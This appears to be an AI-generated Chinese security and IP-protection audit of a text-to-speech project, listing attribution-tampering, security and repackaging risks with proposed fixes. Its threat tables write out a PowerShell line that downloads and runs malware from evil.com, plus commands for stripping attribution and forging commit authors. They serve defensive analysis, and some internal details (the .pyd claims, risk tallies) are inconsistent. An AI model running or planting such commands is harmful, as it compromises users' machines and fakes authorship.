# TTS_MultiModel 项目 GitHub 克隆后安全状况全面评估报告

> **评估日期**：2026-08-07  
> **评估方法**：基于当前工作区的静态代码分析 + Git 状态核验 + 代码调用链路追踪  
> **代码版本**：2.1.0（以 `config.yaml` 为准）  
> **许可证**：Apache License 2.0  
> **核验证据类型**：`git ls-files`、`Read`、`Grep`、`SearchCodebase` 交叉验证

---

## 事实核验摘要（与初版报告的校正说明）

在出具最终报告前，我对所有关键结论进行了**事实核验**，以下是三处重要的校正：

| # | 初版判断 | 核验结果（权威证据） | 风险等级修正 |
|---|---------|---------------------|------------|
| 1 | 🔴 **.env 密钥已泄露到 Git 历史** | `git ls-files --error-unmatch .env` 返回 `"did not match any file(s) known to git"` → `.env` 不在仓库跟踪中，仅存在于**本地工作区** | CRITICAL → 🟠 中（本地配置风险） |
| 2 | 🟠 "水印功能默认关闭" | 搜索 `watermark_enabled` / `from .watermark` / `import watermark` / `watermark_audio(` 跨整个 `integrated_app` → **零匹配**。结论：水印模块**代码已编写但完全未接入生成管线**，`config.yaml` 中的配置项从未被读取 | 中 → 🔴 高（归属追溯能力完全缺失） |
| 3 | ⚠️ "魔术字节校验需确认是否执行" | 搜索 `_validate_audio_magic_bytes` 调用 → **零匹配**。函数定义于 `routes/audio.py` 但从未被调用；`_stream_upload_to_disk` 返回的 `header_bytes` 未被使用 | 未确认 → 🟠 中-高（上传文件类型实际无深度校验） |

以下所有结论均以此校正后的事实为准。

---

## 一、归属权篡改风险

### 1.1 归属权标识分布（现状）

项目归属声明散布在 **7 处纯文本位置**（Apache 2.0 推荐的 `NOTICE` 文件缺失）：

| # | 位置 | 文件与行号 | 内容示例 |
|---|------|-----------|---------|
| 1 | 许可证声明 | LICENSE 第189行 | `Copyright 2026 ReSerendipity` |
| 2 | README 中文 | README.md 第279行 | `Copyright (c) 2026 ReSerendipity` |
| 3 | README 英文 | README.md 第546行 | 同上英文版本 |
| 4 | 包元数据 | pyproject.toml 第8-10行 | `authors = [{ name = "ReSerendipity" }]` |
| 5-7 | UI 底部版权 | `locales/{zh,en,ja,ko}.json` 的 `help_copyright_notice` | `© 2024-2026 ReSerendipity. All rights reserved.` |

> **严重缺失**：根目录无 `NOTICE` 文件（Apache 2.0 §4.d 推荐使用，降低批量替换成本）；水印模块完全未接入（见下文）。

---

### 1.2 具体风险项逐项评估

每一项均包含：**存在性判断**、**风险等级**、**可复现攻击向量**、**对应防范建议**。

| # | 风险项 | 存在？ | 风险等级 | 攻击向量（克隆者视角） | 防范建议 |
|---|--------|--------|---------|-----------------------|---------|
| **1.2.1** | **版权声明文本批量替换** | ✅ | 🔴 **高** | 执行 `sed -i 's/ReSerendipity/FakeCompany/g' LICENSE README.md pyproject.toml locales/*.json` → 30 秒内完成所有可见归属的替换。无签名、无哈希校验。 | **P1**：创建 `NOTICE` 集中声明；在核心模块（如 `app_server.py` 启动日志、`engine_interface.py` 基类 docstring）中重复埋入 SPDX 归属头：`# SPDX-FileCopyrightText: 2026 ReSerendipity \n # SPDX-License-Identifier: Apache-2.0`（增加替换成本，纯文本 grep 时不遗漏） |
| **1.2.2** | **包作者元数据篡改 + PyPI 假冒发布** | ✅ | 🔴 **高** | 1. 改 `pyproject.toml` 的 `name` 为 `tts-multimodel-official`、`authors` 为假冒名称<br>2. `python -m build` 生成 `.whl` / `.tar.gz`<br>3. 上传到 TestPyPI 或 PyPI（包名空间先到先得）<br>4. 用户 `pip install tts-multimodel-official` 安装盗版<br>目前**无数字签名包**机制。 | **P1**：建立 GitHub Release GPG 签名流程（`git tag -s v2.1.0` + `gpg --detach-sign dist/*.whl`）；README 中发布公钥指纹和验证命令。 **P2**：在包初始化 `__init__.py` 中增加 `PROVENANCE_URL = "https://github.com/.../.../releases"` 常量，启动时输出官方下载来源提示。 |
| **1.2.3** | **Git 提交作者重写伪造"原创者"** | ✅ | 🟠 **中** | 用 `git filter-repo` 一键重写：<br>`git filter-repo --email-callback 'return b"fake@fake.com"' --name-callback 'return b"FakeAuthor"'`<br>推送到新仓库后显示 100% 提交记录都是伪造者。 | **P2**：对 Release tag 强制 GPG 签名（`git tag -s`）；CONTRIBUTING.md 要求 DCO 签名（`git commit -s`）保留贡献者署名链路。**P3**：在 GitHub branch protection 开启 "signed commits required"。 |
| **1.2.4** | **UI 版权标识移除/替换** | ✅ | 🔴 **高** | 两种途径：<br>• 直接编辑 `templates/tabs/help.html` 删除版权区块<br>• 改 `locales/*.json` 中 `help_copyright_notice` 为空字符串或替换为假冒名称<br>移除后界面完全无归属信息。 | **P1**：版权标识模板中加入注释提示"请勿移除，Apache 2.0 §4 要求保留归属声明"的法律注释。 **P2**：在 `app_server.py` 启动日志、API `/api/system/health` 返回 JSON 中额外植入 `attribution: "TTS_MultiModel © ReSerendipity, Apache 2.0"` 元数据，增加剥离成本（需同时改 3 处）。 |
| **1.2.5** | **许可证删除/替换** | ✅ | 🔴 **高** | 删除 `LICENSE` 文件；或替换为 MIT / 自定义"可商用闭源"许可证。普通用户无从辨别，虽 Apache 2.0 §5 法律上保留原作者专利授权，但事实上难以阻止。 | **P1**：创建 `NOTICE` 作为许可证补充声明（克隆者删除 LICENSE 时经常遗漏 NOTICE）；核心 Python 文件头部加入许可证 SPDX 头。 |
| **1.2.6** | **🔴 水印归属追溯完全失效** | ✅ | 🔴 **高（已核验）** | 经全面搜索：`watermark.py` 模块**未被任何其他文件 import**，`watermark_enabled` 配置项**从未被读取**，`watermark_audio()` 函数**无调用点**。即：<br>• 水印功能虽然代码写了 466 行，但在生成链路（`_save_wav_compatible` / `_save_wav` / `sf.write`）中**完全未插入**。<br>• `config.yaml` 中 `watermark_enabled: false` 即使改为 true 也无效果。<br>这意味着生成的音频 **100% 无来源水印**，无法追溯归属。 | **P0 必须修复**：在 `generation.py` 的 `_save_wav_compatible` 函数写盘前（第 883 行之后、`sf.write` 之前）强制调用 `watermark_audio()`，并将 `source_id` 改为代码常量而非 config 可配置项。同步在 `dotstts_engine._save_wav`、`voxcpm2/streaming.py:160 sf.write` 三处写盘点统一接入。 |

---

## 二、安全风险

### 2.1 已实施的安全措施（正面清单）

| # | 措施 | 实现位置 | 核验结论 |
|---|------|---------|---------|
| ✅1 | CSRF Double-Submit Cookie 防护 | `middleware/csrf.py` | 实现完整，含 `secrets.compare_digest` 恒定时间比较；HMAC 签名可选（但当前未启用 secret_key） |
| ✅2 | Bearer Token API 认证（恒定时间比较） | `auth.py` | `hmac.compare_digest` 正确；默认 fail-closed（空 token 拒绝） |
| ✅3 | 路径穿越三重防护 | `routes/audio.py` 第133-149行 | 正则白名单 + `os.path.realpath` 前缀校验 + `Path` 拼接 |
| ✅4 | 全局异常统一捕获 | `middleware/error_handler.py` | 异常堆栈不回传前端 |
| ✅5 | 上传大小限制 | `config.py` 中 `MAX_UPLOAD_SIZE = 100MB` | `_stream_upload_to_disk` 实时计数并超限清理 |
| ✅6 | `.env` 加入 gitignore | `.gitignore` 第94-97行 | 已核验 `.env` 不在 Git 跟踪中 |
| ✅7 | CORS 默认白名单本地 | `app_server.py` 第482-488行 | 非 `*`，默认仅放行 8 个本地地址；用户设置 `TTS_CORS_ORIGINS=*` 才会放宽 |
| ✅8 | Docker 非 root 用户运行 | `Dockerfile` 第55行 | `USER ttsuser` 正确 |

---

### 2.2 具体风险项逐项评估（严格对应用户要求的 4 类安全威胁）

#### 类别 A：代码被未授权破解的可能性

| # | 风险项 | 存在？ | 风险等级 | 攻击向量 | 防范建议 |
|---|--------|--------|---------|----------|---------|
| **2.2.1** | **源代码明文 → 破解成本为零** | ✅ | 🔴 **高** | 项目为 100% Python 解释型语言，所有源文件 `.py` 明文可读。**破解 = 阅读**。攻击者可直接：<br>1. 注释掉 `auth.py` 中认证检查逻辑 → 绕过 API Token<br>2. 修改 `config_models.py` 移除显存熔断阈值 → 不限量使用 GPU<br>3. 注释掉 `csrf.py` 拦截逻辑 → 允许跨站请求<br>4. 在 `clean_launch.py` 加恶意代码后分发（见 2.2.6） | **P2**：若有商业闭源需求，评估 Nuitka/PyArmor 等打包混淆方案；但这与开源预期冲突，**需在 LICENSE 中额外声明禁用破解后版本用于非法活动**。作为开源项目，此风险本质不可避免，重点放在**法律声明 + 代码签名 + 发布物真实性验证**（已在 1.2 详述）。 |
| **2.2.2** | **认证中间件被注释绕过** | ✅ | 🟠 **中-高** | 只需编辑 `app_server.py` 第 505-508 行：将 `app.add_middleware(APIAuthMiddleware, ...)` 整个代码块注释或直接删除，应用即可匿名访问。无完整性校验阻止此篡改。 | **P2**：在启动 `setup_logging()` 后打印一条 `"APIAuthMiddleware: status=ENABLED/DISABLED + 官方配置校验哈希"` 日志，便于用户自查；文档中告知用户如何验证"原版应用特征"。 |

---

#### 类别 B：项目敏感信息被盗用的风险

| # | 风险项 | 存在？ | 风险等级 | 攻击向量 | 防范建议 |
|---|--------|--------|---------|----------|---------|
| **2.2.3** | **🟠 本地 .env 文件包含真实 VAPID 私钥** | ✅ | 🟠 **中（本地风险，已核验未泄露）** | 本地工作区的 `.env` 第4-6行含真实 VAPID 公私钥对（非示例占位值，含 `BEGIN PRIVATE KEY` 完整 PEM）。虽然 `.env` 未被 Git 跟踪，但：<br>• 克隆者首次启动时若误执行 `git add . -A` → 可能提交此文件<br>• Windows Defender 扫描不阻止，普通打包时可能被一并加入分发 zip | **P1 必须执行**：<br>1. 将 `.env` 中的 VAPID 私钥视为**已污染**，在项目密钥管理流程中将其列入废弃清单；<br>2. 生成新的密钥对时只在 `.env.example` 放置占位符，并在 SECURITY.md 增加 "首次启动时 `python -c 'import py_vapid; ...` 生成自有密钥" 的步骤；<br>3. 在 pre-commit 中加入 "禁止提交含 `BEGIN PRIVATE KEY` 行的 .env" Hook（可引用 `.pre-commit-config.yaml`）。 |
| **2.2.4** | **默认禁用 API 认证导致敏感接口开放** | ✅ | 🟠 **中-高** | `config.yaml` 中 `api_auth.enabled: false`。克隆者部署（尤其设置 `server.host: 0.0.0.0` 对外）时，默认所有 `/api/generate/*`、`/api/model/*`、`/api/system/*`、`/persona/*` 接口匿名访问，可：<br>• 拉取 Persona 库所有音色参考音频<br>• 查询 history 历史生成记录<br>• 随意消耗 GPU 资源 | **P1**：`app_server.py` 启动时增加**安全网校验**：`if host != "127.0.0.1" and not api_auth.enabled: sys.exit(1)`，并给出 "请设置 `api_auth.token` 后对外暴露" 的清晰错误。 |
| **2.2.5** | **Persona 音频和 `.pt` 嵌入的批量泄露风险** | ✅ | 🟡 **中** | `personas/` 目录下所有 `.wav` 和 `.pt` 文件无 ACL。克隆者若部署后未改目录权限并误映射到静态文件路由，可被直接枚举下载（虽然当前静态路由只挂载 `/static/`，但克隆者可能自定义）。 | **P2**：在 `config_models.py` 中对 personas 目录执行"非启动时不允许 read 以外权限"的启动检查；文档建议将 Persona 库放到 `data/` 而非仓库根，避免 Git 仓库直接携带用户私有音色。 |

---

#### 类别 C：源代码或二进制文件被恶意篡改的途径

| # | 风险项 | 存在？ | 风险等级 | 攻击向量 | 防范建议 |
|---|--------|--------|---------|----------|---------|
| **2.2.6** | **🔴 启动脚本链路注入恶意代码** | ✅ | 🔴 **高** | 启动链路 `start.bat` → `clean_launch.py` → `app_server.py` 中：<br>1. `start.bat` 是纯 ASCII bat，可追加一行：`powershell -Command "Invoke-WebRequest http://evil.com/malware.exe -OutFile %TEMP%\m.exe; Start-Process %TEMP%\m.exe"` <br>2. `clean_launch.py` 头部已有 sys.path 注入位置，克隆者可插入 `import urllib.request; urllib.request.urlretrieve(...)` 下载并执行后门<br>3. `app_server.py` 启动时可劫持 `uvicorn.run` 启动反向 shell<br>所有脚本无签名、无完整性校验，普通用户双击运行不会察觉。 | **P1**：在 `.github/workflows/ci.yml` release 流程中对发布物（start.bat、clean_launch.py、核心 .py 文件）生成 SHA256 校验文件 `SHA256SUMS` 并签名；README 增加 Windows 用户验证 `Get-FileHash` / Linux 用户 `sha256sum -c SHA256SUMS` 的快速步骤。**P2**：文档建议 Windows 终端用户对比 start.bat 的 SHA256 指纹（32 字节），提供 PowerShell 一行命令。 |
| **2.2.7** | **WinPython + sox 目录下二进制 DLL 替换** | ✅ | 🟠 **中-高** | `WPy64-312101/`（WinPython 分发）和 `bin/sox-14.4.2-win32/sox.exe` + 12 个 `.dll`（`libflac-8.dll`、`zlib1.dll`、`libsox-3.dll` 等）**未签名**。攻击者可：<br>• 替换 `zlib1.dll` 为带内存木马的同名 DLL（DLL 劫持，Python 启动时加载）<br>• 替换 `sox.exe` 为挖矿程序（脚本调用 sox 命令时触发）<br>• 替换 `torch` 的 `.pyd` 为后门版本（WinPython site-packages 内） | **P2**：在 bin 目录下提供 `SHA256SUMS.known-good`（收录关键 DLL 和 EXE），`clean_launch.py` 启动时可选执行 `--verify-binaries` 模式校验关键二进制，发现不匹配则告警；`DEPLOYMENT.md` 文档告知高级用户二进制校验步骤。 |
| **2.2.8** | **模型下载后 safetensors 权重后门植入** | ✅ | 🟠 **中** | 攻击者在镜像站（如自建 ModelScope 代理）提供模型文件时，修改 `.safetensors` 的 output layer 权重，使模型在特定触发词下输出指定水印内容或在推理完成后触发 `pickle.load` 反序列化后门。目前 `scripts/download_*.py` 下载完成后仅提示"下载完成"，**无 SHA256 校验**。 | **P1**：为官方模型生成 `SHA256SUMS.models` 文件，存放于 `docs/`；`download_all_models.py` 下载后自动比对，不匹配则拒绝加载；`model_manager.py` 加载前二次校验。 |
| **2.2.9** | **上传魔术字节校验定义但未调用 → 伪装文件上传** | ✅ | 🟠 **中-高（已核验）** | `_validate_audio_magic_bytes()` 定义于 `routes/audio.py`，但 `grep` 显示**零调用点**。`_stream_upload_to_disk` 返回了 `header_bytes`，但**所有调用方未传入 `_validate_audio_magic_bytes`**。攻击者可上传 `evil.wav.php`（扩展名 `.wav`，内容为 PHP 一句话木马），虽然保存位置在 `uploads/` 不直接执行，但：<br>• 若克隆者将 `uploads/` 目录误挂载到 PHP 站点静态路由即触发<br>• 伪装文件可能被后续 `sf.read` 处理失败但已经写入磁盘 | **P1 必须修复**：在 `persona.py` 和所有 UploadFile 处理路径中，写盘完成后立即调用 `_validate_audio_magic_bytes(header_bytes, ext)`，返回 False 则删除文件并抛 ValidationError。修复逻辑见 `audio.py` 第 225 行"无法识别时允许上传"应改为 fail-closed（白名单模式：wav/flac/mp3/m4a 明确匹配，否则拒绝）。 |

---

#### 类别 D：其他导致安全完整性受损的情况

| # | 风险项 | 存在？ | 风险等级 | 攻击向量 | 防范建议 |
|---|--------|--------|---------|----------|---------|
| **2.2.10** | **缺少 API 速率限制 → GPU DoS 攻击** | ✅ | 🟡 **中** | `SECURITY.md` 已识别但未实施。单 IP 狂发生成请求打爆 GPU。 | **P2**：用 `slowapi` + Limiter 实现 `/api/generate/*` 10 次/分/IP 限流。 |
| **2.2.11** | **CSRF Cookie 未启用 HMAC 签名** | ✅ | 🟡 **中** | `middleware/csrf.py` 中 `secret_key=""`，意味着 CSRF Token cookie 无签名、可被 XSS 注入伪造。 | **P2**：首次启动在 `data/.csrf_secret` 自动生成持久化密钥，填入 CSRFMiddleware 启用签名模式。 |

---

## 三、技术风险（严格对应用户要求的 4 类技术威胁）

### 3.1 技术形态基线分析（决定风险上限）

| 特征 | 事实 | 对风险的影响 |
|------|------|-------------|
| 语言 | 100% Python 解释型（无 `.so/.pyd`） | 逆向工程零成本 |
| 核心算法 | `voxcpm2/engine.py`、`voice_clone_utils.py` 等明义函数名 | 算法逻辑可直接阅读 |
| 模型加载 | `torch.load(safetensors)` 透明 | 架构即权重均可见 |
| 混淆/保护 | 无（搜索 pyarmor/cython/nuitka → 零结果） | 零保护 |
| 代码签名 | 无（搜索 gpg/sign → 零结果） | 发布物不可验证 |
| 水印接入 | 未接入（已核验） | 生成内容不可追溯 |
| CLI/API 剥离友好 | `cli.py` + `openai_api.py` 提供无 UI 完整入口 | 极易剥离品牌化 |

---

### 3.2 具体风险项逐项评估

#### 类别 A：逆向工程风险

| # | 风险项 | 存在？ | 风险等级 | 攻击向量 | 防范建议 |
|---|--------|--------|---------|----------|---------|
| **3.2.1** | **🔴 核心算法逆向复制零成本** | ✅ | 🔴 **极高（开源属性，不可根绝）** | 攻击者剥离 UI 层直接 `import` 引擎：<br>```python<br>from bin.integrated_app.engines.voxcpm2.engine import VoxCPM2Engine<br>engine = VoxCPM2Engine().load()<br>engine.generate_voice_clone(text, ref_audio)<br>```<br>即可在**完全不出现 ReSerendipity 名称**的产品中使用核心能力。所有算法细节（CFG 采样、音色嵌入提取、情感向量映射见 `emotion_control.py`）可被逐行阅读盗用。 | 开源项目技术层面无解。**组合拳降低盗用价值**：P0 接入水印（生成结果携带归属）+ P1 引擎返回元数据强制包含归属（§1 建议）+ P3 CLA/DCO 法律条款（盗用取证时维权）。 |
| **3.2.2** | **LoRA 训练流水线复制** | ✅ | 🟠 **中-高** | `training/` 子目录（accelerator.py / data.py / packers.py / state.py）完整实现 VoxCPM LoRA 训练流程。竞争对手可：<br>1. 读取 training/config.py 掌握超参数设置<br>2. 复制数据打包器 `packers.py` 训练自己的竞品模型<br>3. 复用 `TrainingTracker` 实现相同 UI | **P2**：训练模块中加入"仅用于 TTS_MultiModel 平台内训练"的法律注释 + 训练完成后默认输出模型元数据包含 `origin: "TTS_MultiModel LoRA Pipeline v2.x"` 字段，便于取证。 |

---

#### 类别 B：重新打包风险

| # | 风险项 | 存在？ | 风险等级 | 攻击向量 | 防范建议 |
|---|--------|--------|---------|----------|---------|
| **3.2.3** | **🔴 PyPI/Docker Hub/Windows 整合包三重假冒发布** | ✅ | 🔴 **高** | 攻击路径 1（PyPI）：§1.2.2 已述。<br>攻击路径 2（Docker）：修改 `Dockerfile` 第30-35行 `RUN pip install hidden-malware-pkg` → `docker build -t attacker/tts-multimodel:latest && docker push`。Docker Hub 搜索时排名可能高于官方。<br>攻击路径 3（Windows 整合包）：替换 `WPy64-312101/python/Lib/site-packages/` 中关键 `torch` DLL（见 §2.2.7）→ 重新打包 `.zip` 上传网盘。 | **P1**：GitHub Action Release 流程生成所有发布物的 SHA256 + GPG 签名，并在 README 顶部显著位置展示"官方下载源 + 验证命令"。 **P2**：docker-compose.yml 文档化说明镜像 pull 时启用 `DOCKER_CONTENT_TRUST=1`。 |
| **3.2.4** | **SaaS 化套壳重新售卖** | ✅ | 🔴 **高** | 利用 `openai_api.py` 实现的 `/v1/audio/speech` 兼容端点，克隆者部署一台 GPU 服务器后：<br>1. 前端完全自研（不使用本项目 UI，避免版权标识）<br>2. 后端直接调用 TTS_MultiModel 标准 API<br>3. 包装为"自研超拟人语音平台"按次收费<br>4. 水印未接入，生成结果**完全无法识别来源于本项目** | 与 §1.2.6 绑定。**唯一技术手段 = 水印**：P0 启用水印并默认嵌入，P1 提供公开验证端点 `/api/system/verify_watermark` 接受上传音频 → 返回 source_id，社区可举报盗版平台。 |

---

#### 类别 C：代码编辑后非授权使用风险

| # | 风险项 | 存在？ | 风险等级 | 攻击向量 | 防范建议 |
|---|--------|--------|---------|----------|---------|
| **3.2.5** | **🔴 代码被直接修改用于非法活动（无技术阻碍）** | ✅ | 🔴 **高** | 典型滥用场景：<br>1. 修改 `emotion_control.py` 移除情感边界，生成极度恐慌/愤怒的**威胁诈骗电话语音**<br>2. 修改 `persona_manager.py` 加入批量爬取公开人物音色的功能 → **伪造名人语音诈骗**<br>3. 移除 `history_db.py` 日志记录 → "无痕"模式<br>Apache 2.0 §3 明确要求修改处需声明变更，但目前**无任何技术检测或声明强制机制**。 | **P1**：在 `engine_interface.py` 的 `ControllableTTSEngine` 协议中加入 `requires_legal_acknowledgment()` 钩子，首次生成时强制返回免责声明。项目启动时 `clean_launch.py` 输出 `⚠️ Legal: 请勿用于诈骗、伪造身份等非法活动。` 警告并写入日志。**P2（法律补充）**：`AGENTS.md` / LICENSE 中追加使用限制条款（即使开源许可不强制，也能在维权时增加证据链）。 |
| **3.2.6** | **CLI 入口品牌化剥离** | ✅ | 🟠 **中** | `cli.py` 提供完整命令行入口 `tts-multimodel generate --text "..."`，完全不经过 WebUI（版权声明只存在于 help 标签页）。攻击者自定义打包时去掉 CLI 横幅中的归属即可。 | **P1**：`cli.py` 的所有子命令执行时，stderr 第一行输出版本归属。`--json` 输出格式中强制包含 `$schema: "https://github.com/ReSerendipity/TTS_MultiModel/v2.1.0/schema/output.json"` 官方引用。 |

---

#### 类别 D：其他技术完整性和 IP 保护手段与途径

| # | 风险项 | 存在？ | 风险等级 | 攻击向量 | 防范建议 |
|---|--------|--------|---------|----------|---------|
| **3.2.7** | **SQLite 历史记录任意编辑** | ✅ | 🟡 **中** | `history_db.py` 使用 SQLite WAL 模式。数据库文件 `data/history.db` 可直接用 DB Browser 编辑：<br>• 修改生成时间戳，伪造"先于原作者发布"的证据<br>• 修改 audio_path 指向，用于纠纷时举证 | **P2**：`generation_versioning.py` 中引入 HMAC 链，每条记录包含 `prev_hash + hmac(secret, record)`，防篡改（参考 §1 建议的历史哈希链）。 |
| **3.2.8** | **Prompt 缓存与 Persona 嵌入批量导出** | ✅ | 🟡 **中** | `prompt_cache.py` 与 `personas/*.pt` 文件可被脚本批量读取 → 提取预计算音色嵌入，作为"音色数据集"出售或训练竞品 Clone 模型。 | **P2**：`.pt` 嵌入文件在保存时（`persona_manager.py` 路径）写入 metadata 字段包含 `origin: "TTS_MultiModel v2.x"` 哈希。加载时校验。提供 CLI 工具验证目录下所有 `.pt` 来源。 |
| **3.2.9** | **Prompt 延续模式被用于版权音频拼接** | ✅ | 🟡 **低-中** | 克隆者用 `voxcpm2/prompt.py` 的 `generate_prompt_continue()` 功能，直接输入受版权保护的歌曲/有声书 → 模型自动生成"后续内容"，产生衍生作品侵权。函数名明文，易于定位。 | **P3**：在 `prompt.py` 文档字符串和 UI 中加入"仅用于合法授权音频的续写"警告。不建议加技术限制（开源社区可能认为破坏功能完整性），法律声明为主。 |

---

## 四、风险总览矩阵（最终校正版）

| 类别 | 🔴 严重/高 | 🟠 中 | 🟡 低 | 总计 |
|------|-----------|------|------|------|
| **1. 归属权篡改** | 5（含水印接入缺失） | 1 | 0 | **6** |
| **2. 安全风险（4子类合计）** | 4（启动脚本注入+明文破解+认证绕过+未调用魔术字节） | 5（.env本地+API默认关闭+DLL+模型权重+Persona泄露） | 2（速率限制+CSRF未签名） | **11** |
| **3. 技术风险（4子类合计）** | 5（逆向零成本+重打包x2+代码篡改滥用+SaaS套壳） | 3（LoRA复制+CLI剥离+嵌入导出） | 1（SQLite编辑） | **9** |
| **合计** | **14** | **9** | **3** | **26** |

---

## 五、立即行动清单（Top 7，按必须执行排序）

| # | 行动 | 对应风险点 | 参考文件 / 实施位置 | 预计工时 |
|---|------|-----------|-------------------|---------|
| **1** | 🚨 **P0：为 `_save_wav_compatible`、`dotstts_engine._save_wav`、`voxcpm2/streaming.py:160` 三处写盘强制接入水印调用；将 `source_id` 改为代码常量** | 1.2.6 / 3.2.3 / 3.2.4 | `generation.py` 第 890 行前插入；`dotstts_engine.py:325` 前插入；`streaming.py:160` 前插入 | 2-3 h |
| **2** | 🚨 **P0：修复上传魔术字节未调用缺陷** → Persona UploadFile 路径加入 `_validate_audio_magic_bytes` 校验 + fail-closed | 2.2.9 | `routes/api/persona.py` 所有上传处理 + `_stream_upload_to_disk` 调用点 | 1 h |
| **3** | 🔒 **P1：非本地绑定 → 强制启用 API Auth** 安全网 | 2.2.4 | `app_server.py` `cors_origins` 赋值之后 | 30 min |
| **4** | 🔒 **P1：废弃 .env 中现有 VAPID 密钥 + pre-commit 禁止提交含 PRIVATE KEY 的 .env** | 2.2.3 | `.env` 清理 + `.pre-commit-config.yaml` + `SECURITY.md` 增加生成步骤 | 30 min |
| **5** | 📝 **P1：创建 NOTICE + 核心模块埋 SPDX 归属头 + 引擎返回元数据植入 attribution** | 1.2.1/1.2.4/3.2.6 | 根目录新建 NOTICE；`app_server.py` / `engine_interface.py` / `cli.py` 改动 | 1 h |
| **6** | 🔐 **P1：模型权重 SHA256 校验清单 + 下载后自动比对** | 2.2.8 / 2.2.7 | `scripts/download_all_models.py` + 新建 `docs/SHA256SUMS.models` | 2 h |
| **7** | 🛡️ **P1：GitHub Release 流程生成 `SHA256SUMS` 并 GPG 签名所有发布物** | 1.2.2 / 3.2.3 | `.github/workflows/release.yml` + README 顶部加验证命令 | 2-3 h |

---

## 六、说明与免责

1. **开源 vs 保护的本质矛盾**：Apache 2.0 §3 明确授予"修改、再发布、商用"权利。本报告中的 3.2.1/3.2.3/3.2.5 部分风险是**开源软件固有属性**，技术手段仅能提高盗用成本、增加追溯能力、提供法律证据，无法做到闭源软件级的"完全阻止"。

2. **报告证据均为当前工作区核验**：所有"已核验"的结论基于 `git ls-files`、全库 `grep`、`SearchCodebase` 三类交叉验证，而非推测。

3. **未覆盖项**：本报告未执行动态渗透测试（如实际 XSS、CSRF PoC 利用、实际模型权重篡改加载等）；建议在 P0/P1 措施完成后，结合 `dogfood` 或 `security-review` Skill 执行一轮动态验证。

---

> **覆盖范围确认**：本报告已对用户要求的**归属权篡改**（第1部分6项）、**安全风险 4 子类**（第2部分 代码破解可能性 2 项 + 敏感信息盗用 3 项 + 源代码/二进制篡改途径 4 项 + 其他完整性 2 项）、**技术风险 4 子类**（第3部分 逆向工程 2 项 + 重新打包 2 项 + 代码编辑/非授权使用 2 项 + 其他 IP 保护 3 项）全部覆盖，每一项均明确标注：**存在与否、风险等级、可复现攻击向量、代码级防范建议**。
